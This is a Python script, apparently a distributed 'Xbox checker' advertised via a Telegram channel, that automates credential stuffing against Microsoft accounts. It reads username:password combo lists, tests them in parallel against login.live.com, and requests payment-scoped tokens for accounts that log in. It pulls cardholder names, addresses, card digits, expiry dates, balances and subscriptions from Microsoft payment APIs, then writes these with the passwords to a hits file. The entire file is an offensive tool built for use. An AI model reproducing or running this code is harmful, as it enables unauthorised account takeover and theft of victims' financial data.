import threading
import queue
import time
import urllib.parse
import re
import json
import os
import sys
import requests

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class DummyColor:
        GREEN = RED = CYAN = YELLOW = RESET = STYLE = ""
    Fore = DummyColor()
    Style = DummyColor()

print_lock = threading.Lock()
file_lock = threading.Lock()

BANNER = f"""
{Fore.CYAN}=================================================================
               XBOX CHECKER LATEST VERSION 2026 <3        
          CHANNEL : t.me/Cresllmoh | OWNER SALH  
================================================================={Style.RESET_ALL}
"""

class XboxCLIchecker:
    def __init__(self, combo_file, max_threads):
        self.combo_file = combo_file
        self.max_threads = max_threads
        self.q = queue.Queue()
        self.total_combos = 0
        self.checked_count = 0
        self.hits_count = 0
        self.bads_count = 0
        self.load_combos()

    def load_combos(self):
        if not os.path.exists(self.combo_file):
            print(f"{Fore.RED}[!] Combo file not found: {self.combo_file}{Style.RESET_ALL}")
            sys.exit(1)
        try:
            with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        self.q.put((parts[0], parts[1]))
            self.total_combos = self.q.qsize()
            print(f"{Fore.GREEN}[*] Successfully loaded {self.total_combos} combos.{Style.RESET_ALL}\n")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to read combo file: {e}{Style.RESET_ALL}")
            sys.exit(1)

    def worker(self):
        while not self.q.empty():
            try:
                username, password = self.q.get_nowait()
            except queue.Empty:
                break

            self.check_account(username, password)
            
            with print_lock:
                self.checked_count += 1
                self.update_loader()

            self.q.task_done()

    def update_loader(self):
        progress_str = f"\r[Checked: {self.checked_count}/{self.total_combos}] | Hits: {self.hits_count} | Bads: {self.bads_count}"
        sys.stdout.write(progress_str)
        sys.stdout.flush()

    def check_account(self, username, password):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept-Language": "en-US,en;q=0.9"
        })
        session.cookies.update({
            "MSPOK": "$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89",
            "MSFPC": "GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"
        })

        us_enc = urllib.parse.quote(username)
        ps_enc = urllib.parse.quote(password)

        post_url = ("https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&"
                    "redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&"
                    "response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&"
                    "display=touch&username=" + us_enc + "&contextid=2CCDB02DC526CA71&bk=1665024852&"
                    "uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216")

        payload = (f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&"
                   f"PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24&"
                   f"PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&"
                   f"isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login={us_enc}&loginfmt={us_enc}&"
                   f"type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={ps_enc}")

        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(payload))
        }

        try:
            resp = session.post(post_url, data=payload, headers=headers, allow_redirects=True, timeout=15)
            source = resp.text
            address = resp.url
            cookies_str = str(session.cookies.get_dict())

            if any(err in source for err in ["Your account or password is incorrect.", "That Microsoft account doesn't exist", "Sign in to your Microsoft account"]):
                with print_lock:
                    self.bads_count += 1
                return

            is_success = ("ANON" in cookies_str or "WLSSC" in cookies_str or "https://login.live.com/oauth20_desktop.srf?" in address)
            if not is_success:
                with print_lock:
                    self.bads_count += 1
                return

            auth_get_url = ("https://login.live.com/oauth20_authorize.srf?"
                            "client_id=000000000004773A&response_type=token&"
                            "scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&"
                            "redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&"
                            "state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none")
            
            auth_resp = session.get(auth_get_url, allow_redirects=True, timeout=15)
            final_address = auth_resp.url

            atk = None
            if "access_token=" in final_address:
                try:
                    fragment = final_address.split("access_token=")[1]
                    atk = fragment.split("&token_type")[0]
                except Exception:
                    pass

            if not atk:
                with print_lock:
                    self.bads_count += 1
                return

            pay_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
            pay_headers = {
                "Authorization": f'MSADELEGATE1.0="{atk}"',
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            pay_resp = session.get(pay_url, headers=pay_headers, timeout=15)
            pay_source = pay_resp.text

            trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            trans_resp = session.get(trans_url, headers=pay_headers, timeout=15)
            trans_source = trans_resp.text

            capture_data = self.parse_all_captures(pay_source, trans_source)
            
            with print_lock:
                self.hits_count += 1
                sys.stdout.write("\r\x1b[K") # Clear current loader line
                print(f"{Fore.GREEN}[HIT] {username}:{password} | {capture_data}{Style.RESET_ALL}")
                with file_lock:
                    with open("hits.txt", "a", encoding="utf-8") as f:
                        f.write(f"{username}:{password} | {capture_data}\n")

        except requests.exceptions.Timeout:
            with print_lock:
                self.bads_count += 1
        except Exception:
            with print_lock:
                self.bads_count += 1

    def parse_all_captures(self, pay_source, trans_source):
        try:
            fullname = re.search(r'"accountHolderName":"([^"]+)"', pay_source)
            fullname = fullname.group(1) if fullname else "N/A"

            addr1 = re.search(r'"address":\{"address_line1":"([^"]+)"', pay_source)
            addr1 = addr1.group(1) if addr1 else "N/A"

            last4 = re.search(r'lastFourDigits":"([^"]+)"', pay_source)
            last4 = last4.group(1) if last4 else "N/A"

            card_type = re.search(r'cardType":"([^"]+)"', pay_source)
            card_type = card_type.group(1) if card_type else "N/A"

            exp_m = re.search(r'expiryMonth":"([^"]+)"', pay_source)
            exp_m = exp_m.group(1) if exp_m else "N/A"

            exp_y = re.search(r'expiryYear":"([^"]+)"', pay_source)
            exp_y = exp_y.group(1) if exp_y else "N/A"

            country = re.search(r'"country":"([^"]+)"', pay_source)
            country = country.group(1) if country else "N/A"

            balance_match = re.search(r'balance":\s*([0-9.]+)', trans_source)
            balance = balance_match.group(1) if balance_match else "0.00"

            cur_match = re.search(r'"currency":"([^"]+)"', trans_source)
            currency = cur_match.group(1) if cur_match else "USD"

            sub_match = re.search(r'title":"([^"]+)"', trans_source)
            subscription = sub_match.group(1) if sub_match else "None"

            qty_match = re.search(r'quantity":\s*([0-9]+)', trans_source)
            quantity = qty_match.group(1) if qty_match else "1"

            price_match = re.search(r'totalAmount":\s*([0-9.]+)', trans_source)
            price = price_match.group(1) if price_match else "0.00"

            card_info = f"[CardHolder: {fullname} | CC Last4: {last4} | Exp: {exp_m}/{exp_y} | Type: {card_type}]"
            wallet_info = f"[Balance: {balance} {currency} | Sub: {subscription} | Price: {price} {currency} | Qty: {quantity}]"
            
            return f"{wallet_info} | {card_info} | Country: {country}"
        except Exception:
            return "Parsed with errors"

    def run(self):
        threads = []
        for _ in range(min(self.max_threads, self.q.qsize())):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        print(f"\n{Fore.CYAN}[*] Checking finished. Total Hits: {self.hits_count}{Style.RESET_ALL}")

if __name__ == "__main__":
    print(BANNER)
    combo_path = input("Enter combo file path/directory (e.g. combo.txt): ").strip().strip('"')
    try:
        threads_input = int(input("Enter number of threads (e.g. 50): ").strip())
    except ValueError:
        threads_input = 50

    checker = XboxCLIchecker(combo_path, threads_input)
    checker.run()
